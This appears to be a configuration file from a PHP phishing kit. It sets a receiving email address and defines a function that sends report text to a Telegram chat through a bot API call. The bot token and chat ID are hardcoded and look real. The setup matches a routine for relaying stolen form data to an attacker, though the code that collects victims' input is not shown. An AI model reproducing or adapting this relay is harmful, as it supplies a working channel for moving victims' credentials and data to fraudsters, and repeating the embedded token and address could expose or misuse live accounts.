<?php
$Receive_email = "richlife09@atomicmail.io";

function send_report($to, $subject, $message) {
    $token = '9152700653:AAEBGwViN8m7SpGnCIoqHEDIbGcsJBljqA0';
    $chat_id = '7213589530';
    $text = $subject . "\n\n" . $message;
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
    ]]);
    file_get_contents($url, false, $ctx);
}
